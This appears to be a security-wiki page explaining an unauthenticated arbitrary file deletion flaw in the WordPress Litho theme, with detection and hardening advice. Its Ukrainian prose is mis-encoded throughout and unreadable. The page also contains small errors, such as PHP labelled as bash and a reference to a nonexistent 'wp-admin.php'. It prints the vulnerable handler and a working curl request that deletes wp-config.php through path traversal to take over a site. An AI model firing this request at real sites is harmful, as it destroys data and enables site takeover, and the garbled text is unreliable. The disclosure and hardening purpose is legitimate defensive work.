### –ù–µ–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–µ –¥–æ–≤—ñ–ª—å–Ω–µ –≤–∏–¥–∞–ª–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ —á–µ—Ä–µ–∑ wp_ajax_nopriv (–¢–µ–º–∞ Litho <= 3.0)

–¢–µ–º–∏ —Ç–∞ –ø–ª–∞–≥—ñ–Ω–∏ WordPress —á–∞—Å—Ç–æ –≤—ñ–¥–∫—Ä–∏–≤–∞—é—Ç—å AJAX –æ–±—Ä–æ–±–Ω–∏–∫–∏ —á–µ—Ä–µ–∑ —Ö—É–∫–∏ `wp_ajax_` —Ç–∞ `wp_ajax_nopriv_`. –ö–æ–ª–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤–∞—Ä—ñ–∞–Ω—Ç **_nopriv_**, **–∑–≤–æ—Ä–æ—Ç–Ω–∏–π –≤–∏–∫–ª–∏–∫ —Å—Ç–∞—î –¥–æ—Å—Ç—É–ø–Ω–∏–º –¥–ª—è –Ω–µ–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏—Ö –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á—ñ–≤**, —Ç–æ–º—É –±—É–¥—å-—è–∫–∞ —á—É—Ç–ª–∏–≤–∞ –¥—ñ—è –ø–æ–≤–∏–Ω–Ω–∞ –¥–æ–¥–∞—Ç–∫–æ–≤–æ —Ä–µ–∞–ª—ñ–∑–æ–≤—É–≤–∞—Ç–∏:

1. –ü–µ—Ä–µ–≤—ñ—Ä–∫—É **–º–æ–∂–ª–∏–≤–æ—Å—Ç–µ–π** (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `current_user_can()` –∞–±–æ –ø—Ä–∏–Ω–∞–π–º–Ω—ñ `is_user_logged_in()`), —ñ
2. **CSRF nonce**, –ø–µ—Ä–µ–≤—ñ—Ä–µ–Ω–∏–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `check_ajax_referer()` / `wp_verify_nonce()`, —ñ
3. **–°—É–≤–æ—Ä—É —Å–∞–Ω—ñ—Ç–∏–∑–∞—Ü—ñ—é / –≤–∞–ª—ñ–¥–∞—Ü—ñ—é –≤–≤–æ–¥—É**.

–ú—É–ª—å—Ç–∏—Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω–∞ —Ç–µ–º–∞ Litho (< 3.1) –∑–∞–±—É–ª–∞ —Ü—ñ 3 –∫–æ–Ω—Ç—Ä–æ–ª—ñ –≤ —Ñ—É–Ω–∫—Ü—ñ—ó *–í–∏–¥–∞–ª–∏—Ç–∏ —Å—ñ–º–µ–π—Å—Ç–≤–æ —à—Ä–∏—Ñ—Ç—ñ–≤* —ñ –≤ —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ –≤—ñ–¥–ø—Ä–∞–≤–∏–ª–∞ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –∫–æ–¥ (—Å–ø—Ä–æ—â–µ–Ω–∏–π):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
–ü—Ä–æ–±–ª–µ–º–∏, —è–∫—ñ –≤–∏–Ω–∏–∫–∞—é—Ç—å —á–µ—Ä–µ–∑ —Ü–µ–π —Ñ—Ä–∞–≥–º–µ–Ω—Ç:

* **–ù–µ–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø** ‚Äì —Ö—É–∫ `wp_ajax_nopriv_` –∑–∞—Ä–µ—î—Å—Ç—Ä–æ–≤–∞–Ω–æ.
* **–í—ñ–¥—Å—É—Ç–Ω—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ nonce / –º–æ–∂–ª–∏–≤–æ—Å—Ç–µ–π** ‚Äì –±—É–¥—å-—è–∫–∏–π –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á –º–æ–∂–µ –∑–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏.
* **–í—ñ–¥—Å—É—Ç–Ω—è —Å–∞–Ω—ñ—Ç–∏–∑–∞—Ü—ñ—è —à–ª—è—Ö—É** ‚Äì —Ä—è–¥–æ–∫ `fontfamily`, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º, –∫–æ–Ω–∫–∞—Ç–µ–Ω—É—î—Ç—å—Å—è –¥–æ —à–ª—è—Ö—É —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏ –±–µ–∑ —Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∫–ª–∞—Å–∏—á–Ω–∏–π `../../` –æ–±—Ö—ñ–¥.

#### –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –≤–∏–¥–∞–ª–∏—Ç–∏ –±—É–¥—å-—è–∫–∏–π —Ñ–∞–π–ª –∞–±–æ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—é **–Ω–∏–∂—á–µ –±–∞–∑–æ–≤–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—å** (–∑–∞–∑–≤–∏—á–∞–π `<wp-root>/wp-content/uploads/`), –Ω–∞–¥—ñ—Å–ª–∞–≤—à–∏ –æ–¥–∏–Ω HTTP POST –∑–∞–ø–∏—Ç:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
–û—Å–∫—ñ–ª—å–∫–∏ `wp-config.php` –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –ø–æ–∑–∞ *uploads*, —á–æ—Ç–∏—Ä–∏ –ø–æ—Å–ª—ñ–¥–æ–≤–Ω–æ—Å—Ç—ñ `../` –¥–æ—Å—Ç–∞—Ç–Ω—ñ –¥–ª—è —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ—ó —É—Å—Ç–∞–Ω–æ–≤–∫–∏. –í–∏–¥–∞–ª–µ–Ω–Ω—è `wp-config.php` –∑–º—É—à—É—î WordPress –ø–µ—Ä–µ–π—Ç–∏ –¥–æ *–º–∞–π—Å—Ç—Ä–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏* –ø—ñ–¥ —á–∞—Å –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –≤—ñ–¥–≤—ñ–¥—É–≤–∞–Ω–Ω—è, —â–æ –¥–æ–∑–≤–æ–ª—è—î –ø–æ–≤–Ω—ñ—Å—Ç—é –∑–∞—Ö–æ–ø–∏—Ç–∏ —Å–∞–π—Ç (–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –ø—Ä–æ—Å—Ç–æ –Ω–∞–¥–∞—î –Ω–æ–≤—É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é –ë–î —ñ —Å—Ç–≤–æ—Ä—é—î –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞).

–Ü–Ω—à—ñ –≤–∞–∂–ª–∏–≤—ñ —Ü—ñ–ª—ñ –≤–∫–ª—é—á–∞—é—Ç—å —Ñ–∞–π–ª–∏ –ø–ª–∞–≥—ñ–Ω—ñ–≤/—Ç–µ–º `.php` (–¥–ª—è –∑–ª–∞–º—É –ø–ª–∞–≥—ñ–Ω—ñ–≤ –±–µ–∑–ø–µ–∫–∏) –∞–±–æ –ø—Ä–∞–≤–∏–ª–∞ `.htaccess`.

#### –ü–µ—Ä–µ–ª—ñ–∫ –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è

* –ë—É–¥—å-—è–∫–∏–π `add_action( 'wp_ajax_nopriv_...')` –∑–≤–æ—Ä–æ—Ç–Ω–∏–π –≤–∏–∫–ª–∏–∫, —è–∫–∏–π –≤–∏–∫–ª–∏–∫–∞—î –¥–æ–ø–æ–º—ñ–∂–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏ (`copy()`, `unlink()`, `$wp_filesystem->delete()`, —Ç–æ—â–æ).
* –ö–æ–Ω–∫–∞—Ç–µ–Ω–∞—Ü—ñ—è –Ω–µ–æ—á–∏—â–µ–Ω–æ–≥–æ –≤–≤–æ–¥—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤ —à–ª—è—Ö–∏ (—à—É–∫–∞–π—Ç–µ `$_POST`, `$_GET`, `$_REQUEST`).
* –í—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å `check_ajax_referer()` —Ç–∞ `current_user_can()`/`is_user_logged_in()`.

#### –ü–æ—Å–∏–ª–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// ‚Ä¶ proceed ‚Ä¶
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  üîí  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **–ó–∞–≤–∂–¥–∏** —Ä–æ–∑–≥–ª—è–¥–∞–π—Ç–µ –±—É–¥—å-—è–∫—É –æ–ø–µ—Ä–∞—Ü—ñ—é –∑–∞–ø–∏—Å—É/–≤–∏–¥–∞–ª–µ–Ω–Ω—è –Ω–∞ –¥–∏—Å–∫—É —è–∫ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω—É —Ç–∞ –¥–≤—ñ—á—ñ –ø–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ:
> ‚Ä¢ –ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è  ‚Ä¢ –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—è  ‚Ä¢ –ù–æ–Ω—Å–∏  ‚Ä¢ –°–∞–Ω—ñ—Ç–∏–∑–∞—Ü—ñ—è –≤–≤–µ–¥–µ–Ω–Ω—è  ‚Ä¢ –û–±–º–µ–∂–µ–Ω–Ω—è —à–ª—è—Ö—É (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —á–µ—Ä–µ–∑ `realpath()` –ø–ª—é—Å `str_starts_with()`).

---

## –ó–∞—Ö–∏—Å—Ç WordPress

### –†–µ–≥—É–ª—è—Ä–Ω—ñ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è

–ü–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ WordPress, –ø–ª–∞–≥—ñ–Ω–∏ —Ç–∞ —Ç–µ–º–∏ –æ–Ω–æ–≤–ª–µ–Ω—ñ. –¢–∞–∫–æ–∂ –ø—ñ–¥—Ç–≤–µ—Ä–¥—ñ—Ç—å, —â–æ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è —É–≤—ñ–º–∫–Ω–µ–Ω–µ —É wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
–¢–∞–∫–æ–∂, **–≤—Å—Ç–∞–Ω–æ–≤–ª—é–π—Ç–µ –ª–∏—à–µ –Ω–∞–¥—ñ–π–Ω—ñ –ø–ª–∞–≥—ñ–Ω–∏ —Ç–∞ —Ç–µ–º–∏ WordPress**.

### –ü–ª–∞–≥—ñ–Ω–∏ –±–µ–∑–ø–µ–∫–∏

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **–Ü–Ω—à—ñ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü—ñ—ó**

- –í–∏–¥–∞–ª—ñ—Ç—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º **admin**
- –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ **—Å–∏–ª—å–Ω—ñ –ø–∞—Ä–æ–ª—ñ** —Ç–∞ **2FA**
- –ü–µ—Ä—ñ–æ–¥–∏—á–Ω–æ **–ø–µ—Ä–µ–≥–ª—è–¥–∞–π—Ç–µ** –ø—Ä–∞–≤–∞ –¥–æ—Å—Ç—É–ø—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤
- **–û–±–º–µ–∂—Ç–µ —Å–ø—Ä–æ–±–∏ –≤—Ö–æ–¥—É**, —â–æ–± –∑–∞–ø–æ–±—ñ–≥—Ç–∏ –∞—Ç–∞–∫–∞–º Brute Force
- –ü–µ—Ä–µ–π–º–µ–Ω—É–π—Ç–µ —Ñ–∞–π–ª **`wp-admin.php`** —ñ –¥–æ–∑–≤–æ–ª—è–π—Ç–µ –¥–æ—Å—Ç—É–ø –ª–∏—à–µ –≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ –∞–±–æ –∑ –ø–µ–≤–Ω–∏—Ö IP-–∞–¥—Ä–µ—Å.

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)

{{#include ../../banners/hacktricks-training.md}}
